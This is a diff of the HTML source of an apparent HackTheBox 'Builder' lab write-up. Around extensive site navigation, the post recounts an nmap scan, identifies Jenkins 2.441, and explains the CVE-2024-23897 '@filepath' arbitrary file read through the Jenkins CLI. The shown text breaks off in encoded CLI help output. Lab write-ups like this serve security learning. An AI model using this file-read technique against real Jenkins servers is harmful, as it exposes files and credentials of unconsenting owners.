@@ -1,27 +1,774 @@
-<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=generator content="Hugo 0.127.0"><meta name=description content="Perplex007's Blog"><meta name=keywords content="hugo,site,new"><meta name=author content="Santhosh Vardan"><title>Builder |
-Perplex007's blog
-</title><link rel=stylesheet href=/css/index_d751713.min.96a155ca235ea4110f3c74ad120b5479b57965571983ab50f129f3cafde1647957ca404764cff59009ebf300839a60e97295038187b33a85a384bdb1537f9050.css integrity="sha512-lqFVyiNepBEPPHStEgtUebV5ZVcZg6tQ8Snzyv3hZHlXykBHZM/1kAnr8wCDmmDpcpUDgYezOoWjhL2xU3+QUA=="></head><body><header class=header><div class=header_left></div><div class=header_middle>Builder -
-Perplex007's blog</div></header><main><aside class=sidebar><ul class=section-tree><li class="dir closed-dir"><span class=dir-text>Portswiggers</span><ul class=section-tree><li class=file><a href=https://example.org/portswigger/sql-injection/portswigger-sql-injection-vulnerbility-bypass-xml-encoding/ title=./portswigger/sql-injection/portswigger-sql-injection-vulnerbility-bypass-xml-encoding/>Sql Injection Vulnerbility With Filter Bypass via XML Encoding</a></li><li class=file><a href=https://example.org/portswigger/sql-injection/portswigger-sql-injection-vulnerbility-where-clause/ title=./portswigger/sql-injection/portswigger-sql-injection-vulnerbility-where-clause/>Sql Injection Vulnerbility in Where Clause Allowing Retrieval of Hidden Data</a></li><li class=file><a href=https://example.org/portswigger/sql-injection/portswigger-sql-injection-vulnerbility-allowing-login-bypass/ title=./portswigger/sql-injection/portswigger-sql-injection-vulnerbility-allowing-login-bypass/>Sql Injection Vulnerbility Allowing Login Bypass</a></li><li class=file><a href=https://example.org/portswigger/sql-injection/portswigger-sql-database-union-attack/ title=./portswigger/sql-injection/portswigger-sql-database-union-attack/>Sql Injection Union Attack Determining the Number of Columns Returned by the Query</a></li><li class=file><a href=https://example.org/portswigger/sql-injection/portswigger-sql-database-querying-oracle/ title=./portswigger/sql-injection/portswigger-sql-database-querying-oracle/>Sql Injection Querying Oracle</a></li><li class=file><a href=https://example.org/portswigger/sql-injection/portswigger-sql-database-querying-non-oracle/ title=./portswigger/sql-injection/portswigger-sql-database-querying-non-oracle/>Sql Injection Querying</a></li><li class=file><a href=https://example.org/portswigger/sql-injection/portswigger-sql-database-listing-oracle-databse/ title=./portswigger/sql-injection/portswigger-sql-database-listing-oracle-databse/>Sql Injection Listing Databse Contents</a></li><li class=file><a href=https://example.org/portswigger/sql-injection/portswigger-sql-database-listing/ title=./portswigger/sql-injection/portswigger-sql-database-listing/>Sql Injection</a></li><li class=file><a href=https://example.org/portswigger/server-side-vuln/portswigger-filepath-traversal/ title=./portswigger/server-side-vuln/portswigger-filepath-traversal/>File Path Traversal Simple Case</a></li></ul></li><li class="dir opened-dir"><span class=dir-text>HackTheBoxes</span><ul class=section-tree><li class=file><a href=https://example.org/hackthebox/windows/htb-crafty/ title=./hackthebox/windows/htb-crafty/>Crafty</a></li><li class=file><a href=https://example.org/hackthebox/starting-point/tier1/htb-sequel/ title=./hackthebox/starting-point/tier1/htb-sequel/>Sequel</a></li><li class=file><a href=https://example.org/hackthebox/starting-point/tier1/htb-responder/ title=./hackthebox/starting-point/tier1/htb-responder/>Responder</a></li><li class=file><a href=https://example.org/hackthebox/starting-point/tier1/htb-crocodile/ title=./hackthebox/starting-point/tier1/htb-crocodile/>Crocodile</a></li><li class=file><a href=https://example.org/hackthebox/starting-point/tier1/htb-appointment/ title=./hackthebox/starting-point/tier1/htb-appointment/>Appointment</a></li><li class=file><a href=https://example.org/hackthebox/starting-point/tier0/htb-meow/ title=./hackthebox/starting-point/tier0/htb-meow/>Meow</a></li><li class=file><a href=https://example.org/hackthebox/starting-point/tier0/htb-fawn/ title=./hackthebox/starting-point/tier0/htb-fawn/>Fawn</a></li><li class=file><a href=https://example.org/hackthebox/starting-point/tier0/htb-dancing/ title=./hackthebox/starting-point/tier0/htb-dancing/>Dancing</a></li><li class=file><a href=https://example.org/hackthebox/linux/htb-keeper/ title=./hackthebox/linux/htb-keeper/>Keeper</a></li><li class=file><a href=https://example.org/hackthebox/linux/htb-perfection/ title=./hackthebox/linux/htb-perfection/>Perfection</a></li><li class=file><a href=https://example.org/hackthebox/linux/htb-builder/ title=./hackthebox/linux/htb-builder/>Builder</a></li><li class=file><a href=https://example.org/hackthebox/linux/htb-academy/ title=./hackthebox/linux/htb-academy/>Academy</a></li></ul></li><li class="dir closed-dir"><span class=dir-text>Bandits</span><ul class=section-tree><li class=file><a href=https://example.org/bandit/bandit-level-5/ title=./bandit/bandit-level-5/>Level5</a></li><li class=file><a href=https://example.org/bandit/bandit-level-4/ title=./bandit/bandit-level-4/>Level4</a></li><li class=file><a href=https://example.org/bandit/bandit-level-3/ title=./bandit/bandit-level-3/>Level3</a></li><li class=file><a href=https://example.org/bandit/bandit-level-2/ title=./bandit/bandit-level-2/>Level2</a></li><li class=file><a href=https://example.org/bandit/bandit-level-1/ title=./bandit/bandit-level-1/>Level1</a></li><li class=file><a href=https://example.org/bandit/bandit-level-0/ title=./bandit/bandit-level-0/>Level0</a></li></ul></li><li class="dir closed-dir"><span class=dir-text>Posts</span><ul class=section-tree><li class=file><a href=https://example.org/posts/new-blog/ title=./posts/new-blog/>Hello</a></li></ul></li></ul></aside><aside class=exapandable></aside><article class=main><button class=sidebar-toggle-btn type=menu aria-expanded=false aria-haspopup=true>
-<i class="bi bi-list"></i></button><div class=title><h1 class=title-header>Builder</h1><div class=author-date-readtime><div class=author title=Author><i class="bi bi-person"></i>
-<a href=/author/santhosh-vardan/ class=cat-btn>Santhosh Vardan</a></div><div class=date title=Date><i class="bi bi-calendar3"></i>
-<time datetime=2024.07.19>2024.07.19</time></div><div class=readtime title="Time to Read"><i class="bi bi-clock"></i>
-7 mins to read</div></div></div><div class=article-meta><div class=categories><i class="bi bi-bookmarks" title=Categories></i>
-<a href=/categories/hackthebox/ class=cat-btn>hackthebox
-</a><a href=/categories/builder/ class=cat-btn>Builder
-</a><a href=/categories/linux/ class=cat-btn>linux
-</a><a href=/categories/medium/ class=cat-btn>Medium</a></div><div class=breadcumb><i class="bi bi-folder"></i>
-<a href=https://example.org/ class=bread-btn><i class="bi bi-house-fill"></i>
-Home
-</a>/
-<a href=https://example.org/hackthebox/ class=bread-btn>HackTheBoxes
-</a>/
-<a href=https://example.org/hackthebox/linux/htb-builder/ class=bread-btn>Builder</a></div></div><nav id=TableOfContents><ul><li><ul><li></li></ul></li></ul></nav><div class=content><p>I started with a Nmap scan to know things that are running on this machine</p><p><img src="https://drive.google.com/file/d/1ExwBwOkvioJhfp7riwW-rGkczk-y15Am/view?usp=sharing" alt>
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <meta name="generator" content="Hugo 0.127.0">
+
+    
+
+    
+
+    
+        
+            <meta
+                name="description"
+                content="Perplex007&#39;s Blog" />
+        
+
+        
+            <meta
+                name="keywords"
+                content="hugo,site,new" />
+        
+
+        
+            <meta
+                name="author"
+                content="Santhosh Vardan" />
+        
+
+    
+
+
+    <title>
+        
+            Builder |
+            Perplex007&#39;s blog
+        
+    </title>
+
+    
+
+
+    
+    
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+    
+
+
+    
+    
+
+    
+
+    
+
+        
+            
+            <link
+                rel="stylesheet"
+                href="/reset.min_6851612176967065231.3662e40c85350bf0bcf308b7db81c173e4b690b862d3c3cde460de5155550bf055b7ff48cddb1cf5255e55f0355196d8dec1d49434b2457842cc77ebea198f3f.css"
+                integrity="sha512-NmLkDIU1C/C88wi324HBc&#43;S2kLhi08PN5GDeUVVVC/BVt/9Izdsc9SVeVfA1UZbY3sHUlDSyRXhCzHfr6hmPPw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/01_layout.26ffaaf7a32c233cbe1c7c9093d3b744e9466ea0a11559a8f3350a40468de72856a6fd3fd8f38bc13f66093fbeeee908d56483cac2ac01de75b17f999fd2606a.css"
+                integrity="sha512-Jv&#43;q96MsIzy&#43;HHyQk9O3ROlGbqChFVmo8zUKQEaN5yhWpv0/2POLwT9mCT&#43;&#43;7ukI1WSDysKsAd51sX&#43;Zn9Jgag==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/02_style.d15c87bb2860a42cf1133f4168fded5c31d3f62640d949b5836135559d49d224eb0f51a700e145965f54d0e707eb1117115fbd08bb0ae563d48653a24fd978bc.css"
+                integrity="sha512-0VyHuyhgpCzxEz9BaP3tXDHT9iZA2Um1g2E1VZ1J0iTrD1GnAOFFll9U0OcH6xEXEV&#43;9CLsK5WPUhlOiT9l4vA==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/03_home.2449c7d2b3e50e8c529690afca1de8366bb234a739e6f0604542ed66305dd111955658d6ac062f33c382791e4033726a1e07f03904704aaaf544d0a7ae36e519.css"
+                integrity="sha512-JEnH0rPlDoxSlpCvyh3oNmuyNKc55vBgRULtZjBd0RGVVljWrAYvM8OCeR5AM3JqHgfwOQRwSqr1RNCnrjblGQ==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/04_responsive.cd3527afabdc02c3c117d57389f622b57e143ac3ee5dcc150b0e4b6ef262353217a1bf92f365e0f23f3021fd5e97abab71b1f06c2c431e885f46a27f5d9e9730.css"
+                integrity="sha512-zTUnr6vcAsPBF9VzifYitX4UOsPuXcwVCw5LbvJiNTIXob&#43;S82Xg8j8wIf1el6urcbHwbCxDHohfRqJ/XZ6XMA==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/05_markdown.b84d310882bf53ceaa3e614e623874bb542bacb17445bb27c2deb29e6dc0525a4d9fa5c49532000df51ca1cb29d2697dcd4ec4ef2493bd86f5d820de17ebae21.css"
+                integrity="sha512-uE0xCIK/U86qPmFOYjh0u1QrrLF0Rbsnwt6ynm3AUlpNn6XElTIADfUcocsp0ml9zU7E7ySTvYb12CDeF&#43;uuIQ==" />
+        
+
+    
+
+
+    
+    
+
+    
+
+    
+
+    
+
+    
+</head>
+
+
+
+    <body>
+        <header class="header">
+    <div class="header_left">
+        
+    </div>
+
+    <div class="header_middle">
+        
+            Builder -
+            Perplex007&#39;s blog
+        
+    </div>
+</header>
+
+
+
+        <main>
+            <aside class="sidebar">
+    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Portswiggers </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/portswigger/sql-injection/portswigger-sql-injection-vulnerbility-bypass-xml-encoding/" title="./portswigger/sql-injection/portswigger-sql-injection-vulnerbility-bypass-xml-encoding/">
+                        
+                            Sql Injection Vulnerbility With Filter Bypass via XML Encoding
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/portswigger/sql-injection/portswigger-sql-injection-vulnerbility-where-clause/" title="./portswigger/sql-injection/portswigger-sql-injection-vulnerbility-where-clause/">
+                        
+                            Sql Injection Vulnerbility in Where Clause Allowing Retrieval of Hidden Data
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/portswigger/sql-injection/portswigger-sql-injection-vulnerbility-allowing-login-bypass/" title="./portswigger/sql-injection/portswigger-sql-injection-vulnerbility-allowing-login-bypass/">
+                        
+                            Sql Injection Vulnerbility Allowing Login Bypass
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/portswigger/sql-injection/portswigger-sql-database-union-attack/" title="./portswigger/sql-injection/portswigger-sql-database-union-attack/">
+                        
+                            Sql Injection Union Attack Determining the Number of Columns Returned by the Query
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/portswigger/sql-injection/portswigger-sql-database-querying-oracle/" title="./portswigger/sql-injection/portswigger-sql-database-querying-oracle/">
+                        
+                            Sql Injection Querying Oracle
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/portswigger/sql-injection/portswigger-sql-database-querying-non-oracle/" title="./portswigger/sql-injection/portswigger-sql-database-querying-non-oracle/">
+                        
+                            Sql Injection Querying
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/portswigger/sql-injection/portswigger-sql-database-listing-oracle-databse/" title="./portswigger/sql-injection/portswigger-sql-database-listing-oracle-databse/">
+                        
+                            Sql Injection Listing Databse Contents
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/portswigger/sql-injection/portswigger-sql-database-listing/" title="./portswigger/sql-injection/portswigger-sql-database-listing/">
+                        
+                            Sql Injection
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/portswigger/server-side-vuln/portswigger-filepath-traversal/" title="./portswigger/server-side-vuln/portswigger-filepath-traversal/">
+                        
+                            File Path Traversal Simple Case
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir opened-dir"
+                    >
+                    <span class="dir-text"> HackTheBoxes </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/hackthebox/windows/htb-crafty/" title="./hackthebox/windows/htb-crafty/">
+                        
+                            Crafty
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/hackthebox/starting-point/tier1/htb-sequel/" title="./hackthebox/starting-point/tier1/htb-sequel/">
+                        
+                            Sequel
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/hackthebox/starting-point/tier1/htb-responder/" title="./hackthebox/starting-point/tier1/htb-responder/">
+                        
+                            Responder
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/hackthebox/starting-point/tier1/htb-crocodile/" title="./hackthebox/starting-point/tier1/htb-crocodile/">
+                        
+                            Crocodile
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/hackthebox/starting-point/tier1/htb-appointment/" title="./hackthebox/starting-point/tier1/htb-appointment/">
+                        
+                            Appointment
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/hackthebox/starting-point/tier0/htb-meow/" title="./hackthebox/starting-point/tier0/htb-meow/">
+                        
+                            Meow
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/hackthebox/starting-point/tier0/htb-fawn/" title="./hackthebox/starting-point/tier0/htb-fawn/">
+                        
+                            Fawn
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/hackthebox/starting-point/tier0/htb-dancing/" title="./hackthebox/starting-point/tier0/htb-dancing/">
+                        
+                            Dancing
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/hackthebox/linux/htb-keeper/" title="./hackthebox/linux/htb-keeper/">
+                        
+                            Keeper
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/hackthebox/linux/htb-perfection/" title="./hackthebox/linux/htb-perfection/">
+                        
+                            Perfection
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/hackthebox/linux/htb-builder/" title="./hackthebox/linux/htb-builder/">
+                        
+                            Builder
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/hackthebox/linux/htb-academy/" title="./hackthebox/linux/htb-academy/">
+                        
+                            Academy
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Bandits </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/bandit/bandit-level-5/" title="./bandit/bandit-level-5/">
+                        
+                            Level5
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/bandit/bandit-level-4/" title="./bandit/bandit-level-4/">
+                        
+                            Level4
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/bandit/bandit-level-3/" title="./bandit/bandit-level-3/">
+                        
+                            Level3
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/bandit/bandit-level-2/" title="./bandit/bandit-level-2/">
+                        
+                            Level2
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/bandit/bandit-level-1/" title="./bandit/bandit-level-1/">
+                        
+                            Level1
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/bandit/bandit-level-0/" title="./bandit/bandit-level-0/">
+                        
+                            Level0
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Posts </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/posts/new-blog/" title="./posts/new-blog/">
+                        
+                            Hello
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+    </ul>
+
+
+</aside>
+<aside class="exapandable"></aside>
+
+
+            
+    <article class="main">
+        <button
+    class="sidebar-toggle-btn"
+    type="menu"
+    aria-expanded="false"
+    aria-haspopup="true">
+    <i class="bi bi-list"></i>
+</button>
+
+
+
+        <div class="title">
+            <h1 class="title-header">
+                Builder
+            </h1>
+
+            <div class="author-date-readtime">
+                
+
+                    
+                        <div class="author" title="Author">
+                            <i class="bi bi-person"></i>
+                            <a
+                                href="/author/santhosh-vardan/"
+                                class="cat-btn">
+                                Santhosh Vardan
+                            </a>
+                        </div>
+                    
+
+                
+
+                
+                    <div class="date" title="Date">
+                        <i class="bi bi-calendar3"></i>
+                        <time
+                            datetime="2024.07.19"
+                            >2024.07.19
+                        </time>
+                    </div>
+                
+
+                
+                    <div
+                        class="readtime"
+                        title="Time to Read">
+                        <i class="bi bi-clock"></i>
+                        7 mins to read
+                    </div>
+                
+            </div>
+        </div>
+
+        <div class="article-meta">
+            
+                <div class="categories">
+                    <i
+                        class="bi bi-bookmarks"
+                        title="Categories"></i>
+                    
+                        <a
+                            href="/categories/hackthebox/"
+                            class="cat-btn">
+                            hackthebox
+                        </a>
+                    
+                        <a
+                            href="/categories/builder/"
+                            class="cat-btn">
+                            Builder
+                        </a>
+                    
+                        <a
+                            href="/categories/linux/"
+                            class="cat-btn">
+                            linux
+                        </a>
+                    
+                        <a
+                            href="/categories/medium/"
+                            class="cat-btn">
+                            Medium
+                        </a>
+                    
+                </div>
+            
+
+            
+
+            
+                <div class="breadcumb">
+                    <i class="bi bi-folder"></i>
+                    
+    
+    
+
+
+
+
+<a href="http://localhost:1313/" class="bread-btn">
+    
+        <i class="bi bi-house-fill"></i>
+    
+
+    
+        Home
+    
+</a>
+
+
+
+
+    /
+
+
+
+<a href="http://localhost:1313/hackthebox/" class="bread-btn">
+    
+
+    
+        HackTheBoxes
+    
+</a>
+
+
+
+
+    /
+
+
+
+<a href="http://localhost:1313/hackthebox/linux/htb-builder/" class="bread-btn">
+    
+
+    
+        
+            Builder
+        
+
+    
+</a>
+
+                </div>
+            
+
+            
+        </div>
+
+        
+            <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        
+
+
+        <div class="content">
+            
+                <p>I started with a Nmap scan to know things that are running on this machine</p>
+<p><img src="https://dl.dropbox.com/scl/fi/34b121k7ebbgk4injmte3/Pasted-image-20240331113546.png?rlkey=sj8xn7qoz0252pcx55d4ri0h0&amp;st=94yli4f1&amp;dl=0" alt="builder 1">
 from the above nmap scan we can see port 22 and 8080 is open
 in port 8080 jetty is running (jetty is a java web server or a servelet container)
-<a href=https://en.wikipedia.org/wiki/Jetty_(web_server)>https://en.wikipedia.org/wiki/Jetty_(web_server)</a></p><p><img src="https://drive.google.com/file/d/1Msv8XGbgUtk-BCw1NRHxcyVhVwRB-lPt/view?usp=sharing" alt></p><p>Here&rsquo;s the jenikins dashboard and jenikins version is 2.441</p><p>in the people tab we have a user called jennifer</p><p>enkins is a Java application. The server is Jetty, a Java web server.</p><p>I’m going to skip the directory brute force given that I know exactly what this application is.</p><p>After a bit of searching i finally fund the vuln for 2.441 version</p><p><a href="https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2024-23897?source=post_page-----143ad7fde347--------------------------------">https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2024-23897?source=post_page-----143ad7fde347--------------------------------</a></p><p><img src="https://drive.google.com/file/d/1wI-KBeAa-9tZ3rud42ldBx1B3gwfDoiK/view?usp=sharing" alt></p><p>from the above information, The <code>jenkins-cli.jar</code> file is a Java archive file that contains the Jenkins CLI utility. This utility allows users to interact with Jenkins from the command line or from scripts.</p><p>for more information about jenikins cli refer to the documentation
-<a href=https://www.jenkins.io/doc/book/managing/cli/#downloading-the-client>https://www.jenkins.io/doc/book/managing/cli/#downloading-the-client</a></p><p>Jenkins CLI allows users to reference a file path using the syntax @[filepath], and Jenkins will replace it with the contents of the referenced file.</p><ol><li><p><strong>User Input</strong>: When using the Jenkins CLI, a user might input a command or script that includes references to files using the @[filepath] syntax. For example:</p><p>bashCopy code</p><p><code>jenkins-cli command @[path/to/file]</code></p></li><li><p><strong>Interpretation</strong>: Jenkins CLI interprets this syntax as a directive to read the contents of the specified file.</p></li><li><p><strong>File Read Operation</strong>: Jenkins CLI then performs a file read operation, reading the contents of the specified file referenced in the command.</p></li><li><p><strong>Replacement</strong>: After reading the file contents, Jenkins replaces the @[filepath] syntax in the command/script with the actual contents of the file.</p></li><li><p><strong>Command Execution</strong>: Finally, Jenkins executes the modified command or script with the replaced file contents.</p></li></ol><p>i downloaded the jenikins cli using the wget command
-<img src="https://drive.google.com/file/d/1-dMO9sm-qQV_vx1fTt2Fc4KkD0Wkpo29/view?usp=sharing" alt></p><p>the command java -jar jenikind-cli.jar -s &lsquo;ip:port&rsquo; help to give the list of all the commands</p><div class=codeblock><div class=copy-button-box><button class=copy-button state=copy data="%e2%94%80%e2%94%80%28kali%e3%89%bfkali%29-[~/Desktop/builder]%0a%e2%94%94%e2%94%80$%20java%20-jar%20jenkins-cli.jar%20-s%20%27http://10.129.230.169:8080%27%20help%20kali%0aPicked%20up%20_JAVA_OPTIONS:%20-Dawt.useSystemAAFontSettings=on%20-Dswing.aatext=true%0a%20%20add-job-to-view%0a%20%20%20%20Adds%20jobs%20to%20view.%0a%20%20build%0a%20%20%20%20Builds%20a%20job,%20and%20optionally%20waits%20until%20its%20completion.%0a%20%20cancel-quiet-down%0a%20%20%20%20Cancel%20the%20effect%20of%20the%20%22quiet-down%22%20command.%0a%20%20clear-queue%0a%20%20%20%20Clears%20the%20build%20queue.%0a%20%20connect-node%0a%20%20%20%20Reconnect%20to%20a%20node%28s%29%0a%20%20console%0a%20%20%20%20Retrieves%20console%20output%20of%20a%20build.%0a%20%20copy-job%0a%20%20%20%20Copies%20a%20job.%0a%20%20create-credentials-by-xml%0a%20%20%20%20Create%20Credential%20by%20XML%0a%20%20create-credentials-domain-by-xml%0a%20%20%20%20Create%20Credentials%20Domain%20by%20XML%0a%20%20create-job%0a%20%20%20%20Creates%20a%20new%20job%20by%20reading%20stdin%20as%20a%20configuration%20XML%20file.%0a%20%20create-node%0a%20%20%20%20Creates%20a%20new%20node%20by%20reading%20stdin%20as%20a%20XML%20configuration.%0a%20%20create-view%0a%20%20%20%20Creates%20a%20new%20view%20by%20reading%20stdin%20as%20a%20XML%20configuration.%0a%20%20declarative-linter%0a%20%20%20%20Validate%20a%20Jenkinsfile%20containing%20a%20Declarative%20Pipeline%0a%20%20delete-builds%0a%20%20%20%20Deletes%20build%20record%28s%29.%0a%20%20delete-credentials%0a%20%20%20%20Delete%20a%20Credential%0a%20%20delete-credentials-domain%0a%20%20%20%20Delete%20a%20Credentials%20Domain%0a%20%20delete-job%0a%20%20%20%20Deletes%20job%28s%29.%0a%20%20delete-node%0a%20%20%20%20Deletes%20node%28s%29%0a%20%20delete-view%0a%20%20%20%20Deletes%20view%28s%29.%0a%20%20disable-job%0a%20%20%20%20Disables%20a%20job.%0a%20%20disable-plugin%0a%20%20%20%20Disable%20one%20or%20more%20installed%20plugins.%0a%20%20disconnect-node%0a%20%20%20%20Disconnects%20from%20a%20node.%0a%20%20enable-job%0a%20%20%20%20Enables%20a%20job.%0a%20%20enable-plugin%0a%20%20%20%20Enables%20one%20or%20more%20installed%20plugins%20transitively.%0a%20%20get-credentials-as-xml%0a%20%20%20%20Get%20a%20Credentials%20as%20XML%20%28secrets%20redacted%29%0a%20%20get-credentials-domain-as-xml%0a%20%20%20%20Get%20a%20Credentials%20Domain%20as%20XML%0a%20%20get-job%0a%20%20%20%20Dumps%20the%20job%20definition%20XML%20to%20stdout.%0a%20%20get-node%0a%20%20%20%20Dumps%20the%20node%20definition%20XML%20to%20stdout.%0a%20%20get-view%0a%20%20%20%20Dumps%20the%20view%20definition%20XML%20to%20stdout.%0a%20%20groovy%0a%20%20%20%20Executes%20the%20specified%20Groovy%20script.%20%0a%20%20groovysh%0a%20%20%20%20Runs%20an%20interactive%20groovy%20shell.%0a%20%20help%0a%20%20%20%20Lists%20all%20the%20available%20commands%20or%20a%20detailed%20description%20of%20single%20command.%0a%20%20import-credentials-as-xml%0a%20%20%20%20Import%20credentials%20as%20XML.%20The%20output%20of%20%22list-credentials-as-xml%22%20can%20be%20used%20as%20input%20here%20as%20is,%20the%20only%20needed%20change%20is%20to%20set%20the%20actual%20Secrets%20which%20are%20redacted%20in%20the%20output.%0a%20%20install-plugin%0a%20%20%20%20Installs%20a%20plugin%20either%20from%20a%20file,%20an%20URL,%20or%20from%20update%20center.%20%0a%20%20keep-build%0a%20%20%20%20Mark%20the%20build%20to%20keep%20the%20build%20forever.%0a%20%20list-changes%0a%20%20%20%20Dumps%20the%20changelog%20for%20the%20specified%20build%28s%29.%0a%20%20list-credentials%0a%20%20%20%20Lists%20the%20Credentials%20in%20a%20specific%20Store%0a%20%20list-credentials-as-xml%0a%20%20%20%20Export%20credentials%20as%20XML.%20The%20output%20of%20this%20command%20can%20be%20used%20as%20input%20for%20%22import-credentials-as-xml%22%20as%20is,%20the%20only%20needed%20change%20is%20to%20set%20the%20actual%20Secrets%20which%20are%20redacted%20in%20the%20output.%0a%20%20list-credentials-context-resolvers%0a%20%20%20%20List%20Credentials%20Context%20Resolvers%0a%20%20list-credentials-providers%0a%20%20%20%20List%20Credentials%20Providers%0a%20%20list-jobs%0a%20%20%20%20Lists%20all%20jobs%20in%20a%20specific%20view%20or%20item%20group.%0a%20%20list-plugins%0a%20%20%20%20Outputs%20a%20list%20of%20installed%20plugins.%0a%20%20mail%0a%20%20%20%20Reads%20stdin%20and%20sends%20that%20out%20as%20an%20e-mail.%0a%20%20offline-node%0a%20%20%20%20Stop%20using%20a%20node%20for%20performing%20builds%20temporarily,%20until%20the%20next%20%22online-node%22%20command.%0a%20%20online-node%0a%20%20%20%20Resume%20using%20a%20node%20for%20performing%20builds,%20to%20cancel%20out%20the%20earlier%20%22offline-node%22%20command.%0a%20%20quiet-down%0a%20%20%20%20Quiet%20down%20Jenkins,%20in%20preparation%20for%20a%20restart.%20Don%e2%80%99t%20start%20any%20builds.%0a%20%20reload-configuration%0a%20%20%20%20Discard%20all%20the%20loaded%20data%20in%20memory%20and%20reload%20everything%20from%20file%20system.%20Useful%20when%20you%20modified%20config%20files%20directly%20on%20disk.%0a%20%20reload-job%0a%20%20%20%20Reload%20job%28s%29%0a%20%20remove-job-from-view%0a%20%20%20%20Removes%20jobs%20from%20view.%0a%20%20replay-pipeline%0a%20%20%20%20Replay%20a%20Pipeline%20build%20with%20edited%20script%20taken%20from%20standard%20input%0a%20%20restart%0a%20%20%20%20Restart%20Jenkins.%0a%20%20restart-from-stage%0a%20%20%20%20Restart%20a%20completed%20Declarative%20Pipeline%20build%20from%20a%20given%20stage.%0a%20%20safe-restart%0a%20%20%20%20Safe%20Restart%20Jenkins.%20Don%e2%80%99t%20start%20any%20builds.%0a%20%20safe-shutdown%0a%20%20%20%20Puts%20Jenkins%20into%20the%20quiet%20mode,%20wait%20for%20existing%20builds%20to%20be%20completed,%20and%20then%20shut%20down%20Jenkins.%0a%20%20session-id%0a%20%20%20%20Outputs%20the%20session%20ID,%20which%20changes%20every%20time%20Jenkins%20restarts.%0a%20%20set-build-description%0a%20%20%20%20Sets%20the%20description%20of%20a%20build.%0a%20%20set-build-display-name%0a%20%20%20%20Sets%20the%20displayName%20of%20a%20build.%0a%20%20shutdown%0a%20%20%20%20Immediately%20shuts%20down%20Jenkins%20server.%0a%20%20stop-builds%0a%